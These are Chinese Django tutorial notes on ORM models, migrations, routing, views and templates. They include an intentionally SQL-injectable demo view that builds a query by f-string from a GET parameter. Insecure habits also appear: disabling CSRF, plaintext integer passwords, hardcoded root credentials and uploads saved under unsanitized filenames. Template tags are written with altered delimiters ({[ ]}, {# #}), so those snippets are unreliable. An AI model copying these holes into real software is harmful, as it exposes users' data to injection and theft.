    }
}
  2.代码声明	
  	django默认用的是mysqldb模块链接MySQL
    但是该模块的兼容性不好 需要手动改为用pymysql链接
    
    你需要告诉django不要用默认的mysqldb还是用pymysql
    # 在项目名下的init或者任意的应用名下的init文件中书写以下代码都可以
    import pymysql
		pymysql.install_as_MySQLdb()
~~~



#### Django ORM   类似于.net的linq语法操作数据库

~~~python
"""
ORM. 对象关系映射
作用:能够让一个不用sql语句的小白也能够通过python 面向对象的代码简单快捷的操作数据库
不足之处:封装程度太高 有时候sql语句的效率偏低 需要你自己写SQL语句

类											表

对象									记录
	
对象属性							记录某个字段对应的值


应用下面的models.py文件
"""

# 1 先去models.py中书写一个类
	class User(models.Model):
    # id int primary_key auto_increment
    id = models.AutoField(primary_key=True)
    # username varchar(32)
    username = models.CharField(max_length=32)
    # password int
    password = models.IntegerField()

*************************# 2 数据库迁移命令*************************
python manage.py makemigrations 将操作记录记录到小本本上(migrations文件夹)

python manage.py migrate  将操作真正的同步到数据库中
# 只要你修改了models.py中跟数据库相关的代码 就必须重新执行上述的两条命令
******************************************************************

class User(models.Model):
    # id int primary_key auto_increment
    id = models.AutoField(primary_key=True,verbose_name='主键')
    # username varchar(32)
    username = models.CharField(max_length=32,verbose_name='用户名')
    """
    CharField必须要指定max_length参数 不指定会直接报错
    verbose_name该参数是所有字段都有的 就是用来对字段的解释
    """
    # password int
    password = models.IntegerField(verbose_name='密码')


class Author(models.Model):
    # 由于一张表中必须要有一个主键字段 并且一般情况下都叫id字段
    # 所以orm当你不定义主键字段的时候 orm会自动帮你创建一个名为id主键字段
    # 也就意味着 后续我们在创建模型表的时候如果主键字段名没有额外的叫法 那么主键字段可以省略不写
    # username varchar(32)
    username = models.CharField(max_length=32)
    # password int
    password = models.IntegerField()
~~~

[![p91G240.png](https://s1.ax1x.com/2023/04/29/p91G240.png)](https://imgse.com/i/p91G240)

[![p91GIu4.png](https://s1.ax1x.com/2023/04/29/p91GIu4.png)](https://imgse.com/i/p91GIu4)

如下，利用

#### 数据的增删改查

~~~python
# 今天只会介绍一点点 后面会详细的介绍

# 查
res = models.User.objects.filter(username=username)
"""
返回值你先看成是列表套数据对象的格式
它也支持索引取值 切片操作 但是不支持负数索引
它也不推荐你使用索引的方式取值
user_obj = models.User.objects.filter(username=username).first()
"""
filter括号内可以携带多个参数 参数与参数之间默认是and关系
你可以把filter联想成where记忆



# 增
from app01 import models
res = models.User.objects.create(username=username,password=password)
# 返回值就是当前被创建的对象本身

# 第二种增加
user_obj = models.User(username=username,password=password)
user_obj.save()  # 保存数据
~~~



~~~
静态文件配置

~~~



* 静态文件配置

  ```python
  """
  在浏览器窗口输入url之所以能够访问到对应的资源是因为后端提前开设了该资源的访问接口
  
  我们习惯将html文件存放在templates文件夹下
  我们习惯将静态文件存放在static文件夹下
  	静态文件
  		网站已经写好的 活着是第三方现成的代码 直接拷贝使用
  		css文件	js文件	img文件	第三方组件
  	
  	static文件夹内还会创建几个文件夹
  		css
  		js
  		img
  		第三方
  	
  	django不会自动帮你创建static文件夹需要你自己手动创建
  """
  STATIC_URL = '/static/'  # 访问静态文件的令牌
  
  # 静态文件配置 settings.py
  STATICFILES_DIRS = [  # 令牌持有者可以访问的文件路径
    os.path.join(BASE_DIR,'static'),
    os.path.join(BASE_DIR,'static1'),
    os.path.join(BASE_DIR,'static2'),
  ]
  """
  查找顺序就是从上往下依次查找，查找到一个就不会继续往下找了所以可能会出现替换的情况
  """
  
  # 令牌动态解析
  <link href="/static/a.txt"></link>	
  
  {# load static #}
  <link href="{# static 'a.txt' #}"></link>	
  ```

* request对象方法

  ```python
  # 登陆功能
  
  # form表单action三个参数写法
  
  request.method  #	获取当前请求方式  全大写的字符串
  
  request.GET		# 获取url问好后面携带的参数
  	.get()  列表最后一个元素
    .getlist()  拿整个列表
  request.POST  # 获取post请求提交过来的普通键值对(不包含文件)
  	.get()  列表最后一个元素
    .getlist()  拿整个列表
  """
  前期我们在朝django后端提交post请求的是时候要先去配置文件中注释一行代码
  MIDDLEWARE = [
  	# csrf...
  ]
  """
  	
  def index(request):
    if request.method == 'POST':
       return HttpResponse('post')
    return HttpResponse('get')
  ```

* pycharm链接数据库

  ```python
  # 找到pycharm database选项(三个地方查找)
  
  # 选取对应的数据库 下载对应的驱动
  """
  明明链接上了数据库 但是看不到表无法操作
  这个时候你只需要将刚刚创建的链接删除 重新链接一次即可
  """
  ```

* django链接MySQL

  ```python
  # 1.配置文件中配置
  DATABASES = {
      'default': {
          'ENGINE': 'django.db.backends.mysql',
          'NAME': 'day60',
          'USER':'root',
          'PASSWORD':'admin123',
          'HOST':'127.0.0.1',
          'PORT':3306,
          'CHARSET':'utf8'
      }
  }
  
  # 2.init文件指定pymysql
  import pymysql
  pymysql.install_as_MySQLdb()
  ```

* django orm(重要)

  ```python
  """
  orm不会帮你创建库 只能创建到表的层面
  需要你自己提前创建好库
  """
  # 对象关系映射
  表					类
  记录			对象
  数据			对象属性/方法
  """
  能够让一个不会sql语句的python程序员也能够简单快捷的操作数据库，极大的提升开发效率
  """
  
  # 去应用下的models.py中书写模型类
  	# 类			模型类
    # 表			模型表
    class UserInfo(models.Model):
      # 当你没有创建主键字段的时候orm会自动帮你创建一个名为id的主键字段
      uid = models.AutoField(primary_key=True)
      # uid int primary key auto_increment
      username = models.CharField(max_length=32)
      # username varchar(32)	CharField字段一定要书写max_length参数
      password = models.IntegerField()
      # password int
  **************************数据库迁移命令*****************************
  1.python manage.py makemigrations
  	# 将操作记录到小本本上(migrations文件夹内)  不能真正的直接操作数据库
  2.python manage.py migrate
  	# 将操作真正的同步到数据库中
  """只要在models中书写了跟数据库相关的代码 就必须要重新执行上述两条命令"""
  
  # pycharm简单快捷输入
  	tools
    	run manage.py task
      	自动提示
  *******************************************************************
  ```

* 简单的orm语句

  ```python
  # 字段的增删改查
  	# 增
    	1.终端里面自己加默认值
      2.null=True
      3.default='666'
      
    # 删
    	注释代码执行两条命令 （然后收拾行李跑路走人）
      # 在操作models.py中的代码的时候一定要细心
    
    # 改
    	修改代码执行两条命令
  
  # 数据的增查
  	# 增
    	from app01 import models
    	1.create()
      	user_obj = models.UserInfo.objects.create(**kwargs)
        # 改方法有一个返回值 就是当前创建的数据对象本身
      2.对象.save()
      	# 先生成一个类对象
        user_obj = models.User(**kwargs)
        # 对象调用save方法
        user_obj.save()
    
    # 查
    	1.filter()							# where
      	res = models.UserInfo.objects.filter(**kwargs)
        """
        返回的结果是一个querySet对象 你可以把它看成是一个列表套数据对象		
        	[数据对象1，数据对象2...]
        
        支持索引和切片操作 但是不支持负数 并且不推荐你使用索引
        
        .first()方法
        
      	filter括号内可以写多个参数 查询的时候默认是and关系
        """
  ```



day61

~~~
1.先在urls.py里面设置好路由
~~~

[![p91NIRx.png](https://s1.ax1x.com/2023/04/29/p91NIRx.png)](https://imgse.com/i/p91NIRx)

~~~
2.在views.py里设置好对应的方法
~~~

[![p91U3TJ.png](https://s1.ax1x.com/2023/04/29/p91U3TJ.png)](https://imgse.com/i/p91U3TJ)

~~~
3.
login方法
正常访问时返回login.html视图
~~~

[![p91Ua6K.png](https://s1.ax1x.com/2023/04/29/p91Ua6K.png)](https://imgse.com/i/p91Ua6K)

[![p91UB0e.png](https://s1.ax1x.com/2023/04/29/p91UB0e.png)](https://imgse.com/i/p91UB0e)

action=""就是提交到当前，如果当前接收是POST方式过来的，就将获取的账户密码进行比对判断，另外通过内置的语句是防SQL注入的

[![p91UDTH.png](https://s1.ax1x.com/2023/04/29/p91UDTH.png)](https://imgse.com/i/p91UDTH)

~~~
然后是reg方法，方法同理
对输入的账户密码进行保存
        user_obj = models.User(username=username,password=password)
        user_obj.save() 
~~~

~~~
访问userlist方法时，用user_queryset = models.User.objects.all()接收到所有的数据，render到userlist.html视图，在这个视图中通过for迭代出每一行的数据进行展示

~~~

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.bootcss.com/twitter-bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdn.bootcss.com/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>
<h1 class="text-center">数据展示</h1>
<div class="container">
    <div class="row">
        <div class="col-md-8 col-md-offset-2">
            <table class="table table-striped table-hover">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>username</th>
                        <th>password</th>
                        <th>action</th>
                    </tr>
                </thead>
                <tbody>
                    {# for user_obj in user_queryset #}
                        <tr>
                            <td>{[ user_obj.id ]}</td>
                            <td>{[ user_obj.username ]}</td>
                            <td>{[ user_obj.password ]}</td>
                            <td>
                                <a href="/edit_user/?user_id={[ user_obj.id ]}" class="btn btn-primary btn-xs">编辑</a>
                                <a href="/delete_user/?user_id={[ user_obj.id ]}" class="btn btn-danger btn-xs">删除</a>
                            </td>
                        </tr>
                    {# endfor #}
                </tbody>
            </table>
        </div>
    </div>
</div>
</body>
</html>
~~~

[![p91UjnU.png](https://s1.ax1x.com/2023/04/29/p91UjnU.png)](https://imgse.com/i/p91UjnU)

增加一个存在注入的demo

在urls.py里

~~~python
path('sql/', views.sql),
~~~

在views.py里

~~~python
def sql(request):
    conn = pymysql.connect(
        host='127.0.0.1',
        port=3306,
        user='root',
        password='root',
        database='day60',
        charset='utf8'  # 编码千万不要加-
    )

    id = request.GET.get('id')
    sql = f"select * from app01_user where id = {id}"

    cursor = conn.cursor(cursor=pymysql.cursors.DictCursor)
    res = cursor.execute(sql)
    return HttpResponse("收到了 宝贝")
~~~

[![p91dCVg.png](https://s1.ax1x.com/2023/04/29/p91dCVg.png)](https://imgse.com/i/p91dCVg)

#### orm创建表关系

~~~python
from django.db import models

# 创建表关系  先将基表创建出来 然后再添加外键字段
class Book(models.Model):
    title = models.CharField(max_length=32)
    price = models.DecimalField(max_digits=8,decimal_places=2)
    # 总共八位 小数点后面占两位
    """
    图书和出版社是一对多 并且书是多的一方 所以外键字段放在书表里面
    """
    publish = models.ForeignKey(to='Publish')  # 默认就是与出版社表的主键字段做外键关联
    """
    如果字段对应的是ForeignKey 那么会orm会自动在字段的后面加_id
    如果你自作聪明的加了_id那么orm还是会在后面继续加_id
    
    后面在定义ForeignKey的时候就不要自己加_id
    """
    """
    图书和作者是多对多的关系 外键字段建在任意一方均可 但是推荐你建在查询频率较高的一方
    """
    authors = models.ManyToManyField(to='Author')
    """
    authors是一个虚拟字段 主要是用来告诉orm 书籍表和作者表是多对多关系
    让orm自动帮你创建第三张关系表
    """
class Publish(models.Model):
    name = models.CharField(max_length=32)
    addr = models.CharField(max_length=32)

class Author(models.Model):
    name = models.CharField(max_length=32)
    age = models.IntegerField()
    """
    作者与作者详情是一对一的关系 外键字段建在任意一方都可以 但是推荐你建在查询频率较高的表中
    """
    author_detail = models.OneToOneField(to='AuthorDetail')
    """
    OneToOneField也会自动给字段加_id后缀
    所以你也不要自作聪明的自己加_id
    """
class AuthorDetail(models.Model):
    phone = models.BigIntegerField()  # 或者直接字符类型
    addr = models.CharField(max_length=32)
~~~

#### django生命周期流程图

[![p91wZYd.jpg](https://s1.ax1x.com/2023/04/29/p91wZYd.jpg)](https://imgse.com/i/p91wZYd)

可以通过缓存数据库减轻后面的压力

#### 路由层

~~~python
# 路由匹配
url(r'test',views.test),
url(r'testadd',views.testadd)
"""
url方法第一个参数是正则表达式
	只要第一个参数正则表达式能够匹配到内容 那么就会立刻停止往下匹配
	直接执行对应的视图函数

你在输入url的时候会默认加斜杠
	django内部帮你做到重定向
		一次匹配不行
		url后面加斜杠再来一次
"""
# 取消自动加斜杠
APPEND_SLASH = False/True	# 默认是自动加斜杠的


urlpatterns = [
    url(r'^admin/', admin.site.urls),
    # 首页
    url(r'^$',views.home),
    # 路由匹配
    url(r'^test/$',views.test),
    url(r'^testadd/$',views.testadd),
    # 尾页(了解)
    url(r'',views.error),
]
~~~

#### 有名分组

```python
"""
可以给正则表达式起一个别名
"""
url(r'^testadd/(?P<year>\d+)',views.testadd)

def testadd(request,year):
    print(year)
    return HttpResponse('testadd')

# 有名分组就是将括号内正则表达式匹配到的内容当作关键字参数传递给后面的视图函数
```

#### 无名有名是否可以混合使用

```python
"""
嘻嘻 不能混用
但是同一个分组可以使用N多次
"""

# 单个的分组可以使用多次
url(r'^index/(\d+)/(\d+)/(\d+)/',views.index),
url(r'^index/(?P<year>\d+)/(?P<age>\d+)/(?P<month>\d+)/',views.index),
```

#### 反向解析

```python
# 通过一些方法得到一个结果 该结果可以直接访问对应的url触发视图函数

# 先给路由与视图函数起一个别名
	url(r'^func_kkk/',views.func,name='ooo')
# 反向解析
	# 后端反向解析
  	from django.shortcuts import render,HttpResponse,redirect,reverse
  	reverse('ooo')
  # 前端反向解析
  	<a href="{# url 'ooo' #}">111</a>
```



#### 回顾

~~~python
# 查询所有数据
	res = models.User.objects.filter()
  res = models.User.objects.all()
# 编辑数据
	"""
	1.首先得获取用户想要编辑的数据主键值
			url?edit_id=1
			url/1/
	2.后端查询出对应的数据对象展示到前端
			利用input标签的value属性
	3.提交post请求修改数据
			前期提交post请求一定要先去配置文件中注释点一行(csrf...)
			如果不注释会报403错误
	"""
  # 批量更新
	models.User.objects.filter(id=edit_id).update(**kwargs)
  # 单个更新
  user_obj = models.User.objects.filter(id=edit_id).first()
  user_obj.username = 'jason'
  user_obj.passsword = '666'
  user_obj.save()
  """
  该方法当字段比较多的时候效率很降低很多
  因为它是从头到尾讲数据所有的字段重新写一遍
  """
# 删除数据
	"""
	1.数据并不会真正意义上的删除，我们在创建表的时候会加一个用来标示是否被删除的字段
		is_delete
		is_alive
		is_status
		...
	删数据其实就是修改字段的状态 之后通过代码筛选出没有删除的状态数据即可
	
	2.删除数据的时候应该有一个二次确认的过程而不应该直接删除
		ajax讲完之后加二次确认结合sweetalaert
	"""
~~~

~~~python
class User:
  models.ForeignKey(to='Publish')
  models.ForeignKey(to=Publish)  # 报错
  
class Publish:
  pass

"""
一对多
	models.ForeignKey(to='关联表名')  常用
	models.ForeignKey(to=关联表名)  	关联表名必须出现在上方(了解即可)
		1.在django1.X版本中外键默认就是级联更新删除的
		2.会自动给字段加_id后缀 无论你有没有加(自己不要自作聪明的加上)
		3.一对多 外键字段建在多的一方
		
一对一
	models.OneToOneField(to='关联表名')
		1.在django1.X版本中外键默认就是级联更新删除的
		2.会自动给字段加_id后缀 无论你有没有加(自己不要自作聪明的加上)
		3.外键建在任意一方均可 但是推荐你建在查询频率较高的表中(orm查询方便)
		
多对多
	models.ManyToManyField(to='关联表名')
		1.在django1.X版本中外键默认就是级联更新删除的
		2.该字段是一个虚拟字段不会真正的在表中展示出来 而是用来告诉Django orm当前表和关联表是多对多的外键关系 需要自动创建第三张关系表
		3.在Django orm中多对多的表关系有好几种（三种）创建方式
		4.外键建在任意一方均可 但是推荐你建在查询频率较高的表中(orm查询方便)
		
判断表关系的方式:换位思考
"""
~~~



#### 无名有名分组反向解析

~~~python
# 无名分组反向解析
	url(r'^index/(\d+)/',views.index,name='xxx')

# 前端
	{# url 'xxx' 123 #}
# 后端
	def index(request, num):
        print(reverse('xxx', args=(1,)))
        return render(request, "home.html")

"""
这个数字写代码的时候应该放什么
	数字一般情况下放的是数据的主键值  数据的编辑和删除
	url(r'^edit/(\d+)/',views.edit,name='xxx')
	
	def edit(request,edit_id):
		reverse('xxx',args=(edit_id,))
		
	{#for user_obj in user_queryset#}
		<a href="{# url 'xxx' user_obj.id #}">编辑</a>
	{#endfor#}

今天每个人都必须完成的作业(*******)
	利用无名有名 反向解析 完成数据的增删改查
"""



# 有名分组反向解析
   url(r'^func/(?P<year>\d+)/',views.func,name='ooo')
# 前端
	<a href="{# url 'ooo' year=123 #}">111</a>  了解
	<a href="{# url 'ooo' 123 #}">222</a>  			记忆

# 后端	
	 # 有名分组反向解析 写法1  了解
   print(reverse('ooo',kwargs={'year':123}))
   # 简便的写法  减少你的脑容量消耗 记跟无名一样的操作即可
   print(reverse('ooo',args=(111,)))
~~~

#### 路由分发

```python
"""
django的每一个应用都可以有自己的templates文件夹 urls.py static文件夹
正是基于上述的特点 django能够非常好的做到分组开发(每个人只写自己的app)
作为组长 只需要将手下书写的app全部拷贝到一个新的django项目中 然后在配置文件里面注册所有的app再利用路由分发的特点将所有的app整合起来

当一个django项目中的url特别多的时候 总路由urls.py代码非常冗余不好维护
这个时候也可以利用路由分发来减轻总路由的压力

利用路由分发之后 总路由不再干路由与视图函数的直接对应关系
而是做一个分发处理
	识别当前url是属于哪个应用下的 直接分发给对应的应用去处理
	
"""


# 总路由
from app01 import urls as app01_urls
from app02 import urls as app02_urls
urlpatterns = [
    url(r'^admin/', admin.site.urls),
    # 1.路由分发
    url(r'^app01/',include(app01_urls)),  # 只要url前缀是app01开头 全部交给app01处理
    url(r'^app02/',include(app02_urls))   # 只要url前缀是app02开头 全部交给app02处理
  
    # 2.终极写法  推荐使用
    url(r'^app01/',include('app01.urls')),
    url(r'^app02/',include('app02.urls'))
    # 注意事项:总路由里面的url千万不能加$结尾
]

# 子路由
	# app01 urls.py
  from django.conf.urls import url
  from app01 import views

  urlpatterns = [
      url(r'^reg/',views.reg)
  ]
  # app02 urls.py
  from django.conf.urls import url
  from app02 import views

  urlpatterns = [
      url(r'^reg/',views.reg)
  ]
```

#### 名称空间

```python
# 当多个应用出现了相同的别名 我们研究反向解析会不会自动识别应用前缀
"""
正常情况下的反向解析是没有办法自动识别前缀的
"""

# 名称空间
	# 总路由
    url(r'^app01/',include('app01.urls',namespace='app01')),
    url(r'^app02/',include('app02.urls',namespace='app02'))
  # 解析的时候
  	# app01
  	urlpatterns = [
    url(r'^reg/',views.reg,name='reg')
		]
    # app02
    urlpatterns = [
    url(r'^reg/',views.reg,name='reg')
		]
    
  	reverse('app01:reg')
    reverse('app02:reg')
    
    {# url 'app01:reg' #}
    {# url 'app02:reg' #}
# 其实只要保证名字不冲突 就没有必要使用名称空间
"""
一般情况下 有多个app的时候我们在起别名的时候会加上app的前缀
这样的话就能够确保多个app之间名字不冲突的问题
"""
urlpatterns = [
    url(r'^reg/',views.reg,name='app01_reg')
]
urlpatterns = [
    url(r'^reg/',views.reg,name='app02_reg')
]
```

#### 伪静态

```python
"""
静态网页
	数据是写死的 万年不变
	
伪静态
	将一个动态网页伪装成静态网页
	
	为什么要伪装呢？
		https://www.cnblogs.com/Dominic-Ji/p/9234099.html
		伪装的目的在于增大本网站的seo查询力度
		并且增加搜索引擎收藏本网上的概率
	
	搜索引擎本质上就是一个巨大的爬虫程序
	
	总结:
		无论你怎么优化 怎么处理
		始终还是干不过RMB玩家
"""
urlpatterns = [
    url(r'^reg.html',views.reg,name='app02_reg')
]
```

#### 虚拟环境

```python
"""
在正常开发中 我们会给每一个项目配备一个该项目独有的解释器环境
该环境内只有该项目用到的模块 用不到一概不装

linux:缺什么才装什么

虚拟环境
	你每创建一个虚拟环境就类似于重新下载了一个纯净的python解释器
	但是虚拟环境不要创建太多，是需要消耗硬盘空间的

扩展:
	每一个项目都需要用到很多模块 并且每个模块版本可能还不一样
	那我该如何安装呢？ 一个个看一个个装？？？
	
	开发当中我们会给每一个项目配备一个requirements.txt文件
	里面书写了该项目所有的模块即版本
	你只需要直接输入一条命令即可一键安装所有模块即版本
"""
```

[![p91WGA1.png](https://s1.ax1x.com/2023/04/29/p91WGA1.png)](https://imgse.com/i/p91WGA1)



#### 视图层

三板斧

~~~python
"""
HttpResponse
	返回字符串类型
render
	返回html页面 并且在返回给浏览器之前还可以给html文件传值
redirect
	重定向
"""
~~~

#### JsonResponse对象

```python
"""
json格式的数据有什么用？
	前后端数据交互需要使用到json作为过渡 实现跨语言传输数据

前端序列化
	JSON.stringify()					json.dumps()
	JSON.parse()							json.loads()
"""
import json
from django.http import JsonResponse
def ab_json(request):
    user_dict = {'username':'jason好帅哦,我好喜欢!','password':'123','hobby':'girl'}

    l = [111,222,333,444,555]
    # 先转成json格式字符串
    # json_str = json.dumps(user_dict,ensure_ascii=False)
    # 将该字符串返回
    # return HttpResponse(json_str)
    # 读源码掌握用法
    # return JsonResponse(user_dict,json_dumps_params={'ensure_ascii':False})
    # In order to allow non-dict objects to be serialized set the safe parameter to False.
    # return JsonResponse(l,safe=False)  
    # 默认只能序列化字典 序列化其他需要加safe参数	
```

#### form表单上传文件及后端如何操作

在settings里面

```
MEDIA_ROOT = os.path.join(BASE_DIR, 'static', 'img')
MEDIA_URL = '/media/'
```

urls.py

~~~python
urlpatterns = [
    re_path(r'^ab_file/',views.ab_file),
] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
~~~

form.html

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.bootcss.com/twitter-bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdn.bootcss.com/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data">
    <p>username:<input type="text" name="username"></p>
    <p>file:<input type="file" name="file"></p>
    <input type="submit">
</form>
</body>
</html>
~~~

views.py

```python
"""
form表单上传文件类型的数据
	1.method必须指定成post
	2.enctype必须换成formdata

"""
import os
def ab_file(request):
    if request.method == 'POST':
        file_obj = request.FILES.get('file')
        file_path = os.path.join(settings.MEDIA_ROOT, file_obj.name)
        with open(file_path,'wb') as f:
            for line in file_obj.chunks():
                f.write(line)
        return HttpResponse('Upload Success!')

    return render(request,'form.html')
```

#### request对象方法

~~~python
"""
request.method
request.POST
request.GET
request.FILES
request.body  # 原生的浏览器发过来的二进制数据  后面详细的讲
request.path 
request.path_info
request.get_full_path()  能过获取完整的url及问号后面的参数 
"""
    print(request.path)  # /app01/ab_file/
    print(request.path_info)  # /app01/ab_file/
    print(request.get_full_path())  # /app01/ab_file/?username=jason
~~~

#### FBV与CBV

~~~python
# 视图函数既可以是函数也可以是类
def index(request):
  return HttpResponse('index')

# CBV
    # CBV路由
    url(r'^login/',views.MyLogin.as_view())
		from django.views import View
		class MyLogin(View):
    	def get(self,request):
        return render(request,'form.html')

    	def post(self,request):
        return HttpResponse('post方法')
      
"""
FBV和CBV各有千秋
CBV特点
	能够直接根据请求方式的不同直接匹配到对应的方法执行
	
	内部到底是怎么实现的？
		CBV内部源码(******)
"""
~~~

self

~~~
1.我们自己的类产生的对象，先从对象本身去找
2.再去产生这个对象的类去找
3.去当前类的父类去找
~~~



#### CBV源码

~~~python
# 你自己不要修改源码 除了bug很难找

# 突破口在urls.py
url(r'^login/',views.MyLogin.as_view())
# url(r'^login/',views.view)  FBV一模一样
# CBV与FBV在路由匹配上本质是一样的 都是路由 对应 函数内存地址
"""
函数名/方法名 加括号执行优先级最高
猜测
    as_view()
        要么是被@staicmethod修饰的静态方法
        要么是被@classmethod修饰的类方法  正确
        
    @classonlymethod
    def as_view(cls, **initkwargs):
        pass
"""

    @classonlymethod
    def as_view(cls, **initkwargs):
        """
        cls就是我们自己写的类   MyCBV
        Main entry point for a request-response process.
        """
        def view(request, *args, **kwargs):
            self = cls(**initkwargs)  # cls是我们自己写的类
            # self = MyLogin(**initkwargs)  产生一个我们自己写的类的对象
            return self.dispatch(request, *args, **kwargs)
            """
            以后你们会经常需要看源码 但是在看python源码的时候 一定要时刻提醒自己面向对象属性方法查找顺序
                先从对象自己找
                再去产生对象的类里面找
                之后再去父类找
                ...
            总结:看源码只要看到了self点一个东西 一定要问你自己当前这个self到底是谁
            """
        return view
      
		# CBV的精髓
    def dispatch(self, request, *args, **kwargs):
        # 获取当前请求的小写格式 然后比对当前请求方式是否合法
        # get请求为例
        # post请求
        if request.method.lower() in self.http_method_names:
            handler = getattr(self, request.method.lower(), self.http_method_not_allowed)
            """
            反射:通过字符串来操作对象的属性或者方法
                handler = getattr(自己写的类产生的对象,'get',当找不到get属性或者方法的时候就会用第三个参数)
                handler = 我们自己写的类里面的get方法
            """
        else:
            handler = self.http_method_not_allowed
        return handler(request, *args, **kwargs)
        """
        自动调用get方法
        """

# 要求掌握到不看源码也能够描述出CBV的内部执行流程(******)
~~~

#### 模版语法传值

{[]}:变量相关

{##}:逻辑相关

```python
def index(request):
    # 模版语法可以传递的后端python数据类型
    n = 123
    f = 11.11
    s = '我也想奔现'
    b = True
    l = ['小红','姗姗','花花','茹茹']
    t = (111,222,333,444)
    d = {'username':'jason','age':18,'info':'这个人有点意思'}
    se = {'晶晶','洋洋','嘤嘤'}

    def func():
        print('我被执行了')
        return '你的另一半在等你'

    class MyClass(object):
        def get_self(self):
            return 'self'

        @staticmethod
        def get_func():
            return 'func'

        @classmethod
        def get_class(cls):
            return 'cls'
        
        # 对象被展示到html页面上 就类似于执行了打印操作也会触发__str__方法
        def __str__(self):
            return '到底会不会？'  
        
    obj = MyClass()

    # return render(request,'index.html',{})  # 一个个传
    return render(request,'index.html',locals())


<p>{[ n ]}</p>
<p>{[ f ]}</p>
<p>{[ s ]}</p>
<p>{[ b ]}</p>
<p>{[ l ]}</p>
<p>{[ d ]}</p>
<p>{[ t ]}</p>
<p>{[ se ]}</p>
<p>传递函数名会自动加括号调用 但是模版语法不支持给函数传额外的参数:{[ func ]}</p>
<p>传类名的时候也会自动加括号调用(实例化){[ MyClass ]}</p>
<p>内部能够自动判断出当前的变量名是否可以加括号调用 如果可以就会自动执行  针对的是函数名和类名</p>
<p>{[ obj ]}</p>
<p>{[ obj.get_self ]}</p>
<p>{[ obj.get_func ]}</p>
<p>{[ obj.get_class ]}</p>


# django模版语法的取值 是固定的格式 只能采用“句点符” .
<p>{[ d.username ]}</p>
<p>{[ l.0 ]}</p>
<p>{[ d.hobby.3.info ]}</p>
# 即可以点键也可以点索引 还可以两者混用
```

#### 过滤器(过滤器只能最多有两个参数)

```python
# 过滤器就类似于是模版语法内置的 内置方法
# django内置有60多个过滤器 我们不需要学这么多 了解10个左右就差不多了 后面碰到了再去记忆



# 基本语法
{[数据|过滤器:参数]}

# 转义
# 前端
	|safe
# 后端
	from django.utils.safestring import mark_safe
  res = mark_safe('<h1>新新</h1>')
"""
以后你在全栈项目的时候 前端代码不一定非要在前端页面书写
也可以现在先在后端写好 然后传递给前端页面
"""


<h1>过滤器</h1>
<p>统计长度:{[ s|length ]}</p>
<p>默认值(第一个参数布尔值是True就展示第一个参数的值否在展示冒号后面的值):{[ b|default:'啥也不是' ]}</p>
<p>文件大小:{[ file_size|filesizeformat ]}</p>
<p>日期格式化:{[ current_time|date:'Y-m-d H:i:s' ]}</p>
<p>切片操作(支持步长):{[ l|slice:'0:4:2' ]}</p>
<p>切取字符(包含三个点):{[ info|truncatechars:9 ]}</p>
<p>切取单词(不包含三个点 按照空格切):{[ egl|truncatewords:9 ]}</p>
<p>切取单词(不包含三个点 按照空格切):{[ info|truncatewords:9 ]}</p>
<p>移除特定的字符:{[ msg|cut:' ' ]}</p>
<p>拼接操作:{[ l|join:'$' ]}</p>
<p>拼接操作(加法):{[ n|add:10 ]}</p>
<p>拼接操作(加法):{[ s|add:msg ]}</p>
<p>转义:{[ hhh|safe ]}</p>
<p>转义:{[ sss|safe ]}</p>
<p>转义:{[ res ]}</p>
```

#### 标签

```python
# for循环
	{# for foo in l #}
    <p>{[ forloop ]}</p>
    <p>{[ foo ]}</p>  一个个元素
	{# endfor #}
  {'parentloop': {}, 'counter0': 0, 'counter': 1, 'revcounter': 6, 'revcounter0': 5, 'first': True, 'last': False}

# if判断
{# if b #}
    <p>baby</p>
{# elif s#}
    <p>都来把</p>
{# else #}
    <p>老baby</p>
{# endif #}


# for与if混合使用
{# for foo in lll #}
    {# if forloop.first #}
        <p>这是我的第一次</p>
    {# elif forloop.last #}
        <p>这是最后一次啊</p>
    {# else #}
        <p>{[ foo ]}</p>
    {# endif #}
    {# empty #}
        <p>for循环的可迭代对象内部没有元素 根本没法循环</p>
{# endfor #}



# 处理字典其他方法
{# for foo in d.keys #}
    <p>{[ foo ]}</p>
{# endfor #}
{# for foo in d.values #}
    <p>{[ foo ]}</p>
{# endfor #}
{# for foo in d.items #}
    <p>{[ foo ]}</p>
{# endfor #}


# with起别名
{# with d.hobby.3.info as nb  #}
    <p>{[ nb ]}</p>
    在with语法内就可以通过as后面的别名快速的使用到前面非常复杂获取数据的方式
    <p>{[ d.hobby.3.info ]}</p>
{# endwith #}
```

#### 自定义过滤器、标签、inclusion_tag

```python
"""
先三步走
	1.在应用下创建一个名字”必须“叫templatetags文件夹
	2.在该文件夹内创建“任意”名称的py文件 eg:mytag.py
	3.在该py文件内"必须"先书写下面两句话(单词一个都不能错)
		from django import template
		
		register = template.Library()
"""

# 自定义过滤器
@register.filter(name='baby')
def my_sum(v1, v2):
    return v1 + v2
# 使用
{# load mytag #}
<p>{[ n|baby:666 ]}</p>


# 自定义标签(参数可以有多个)			类似于自定义函数
@register.simple_tag(name='plus')
def index(a,b,c,d):
    return '%s-%s-%s-%s'%(a,b,c,d)
# 使用
标签多个参数彼此之间空格隔开
<p>{# plus 'jason' 123 123 123 #}</p>


# 自定义inclusion_tag
"""
内部原理
	先定义一个方法 
	在页面上调用该方法 并且可以传值
	该方法会生成一些数据然后传递给一个html页面
	之后将渲染好的结果放到调用的位置
"""
@register.inclusion_tag('left_menu.html')
def left(n):
    data = ['第{}项'.format(i) for i in range(n)]
    # 第一种
    # return {'data':data}  # 将data传递给left_menu.html
    # 第二种
    return locals()  # 将data传递给left_menu.html
  
{# left 5 #}
